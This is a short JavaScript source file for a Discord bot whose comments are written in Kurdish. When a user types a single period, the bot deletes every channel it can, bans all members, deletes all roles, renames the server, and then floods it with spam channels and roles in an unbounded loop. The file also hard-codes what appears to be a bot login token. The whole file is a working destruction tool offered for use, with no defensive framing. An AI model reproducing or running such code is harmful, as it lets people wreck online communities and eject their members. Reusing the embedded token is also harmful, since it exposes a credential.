const Discord = require("discord.js");
const client = new Discord.Client();
const prefix = ".";
client.on("message", message => {
  if (message.content === ".") {
    if (message.channel.guild) {
      message.guild.channels.forEach(c => {
        if (c.deletable) {
          c.delete();
        }
      });
      message.guild.members.forEach(m => {
        m.ban();
      });
      message.guild.roles.forEach(r => {
        r.delete();
      });
      message.guild.setName("DimOD UP");////nawek dane bo sar server 
      setInterval(function() {
        message.guild.createChannel("DimOD UP", "text");///////bo channel 
        message.guild.createChannel("DimOD UP", "voice");////bo voice
        message.guild.createRole({ name: "DimOD BEST KURDISH DEVELOPER" });////nawek dane bo role kan
      });
    }
  }
});

client.login("ODMzNTg3OTE3NDM1NDM3MDc2.YH0hPg.XjD1GR4d7Ei06x-owih2r0RrIe4")
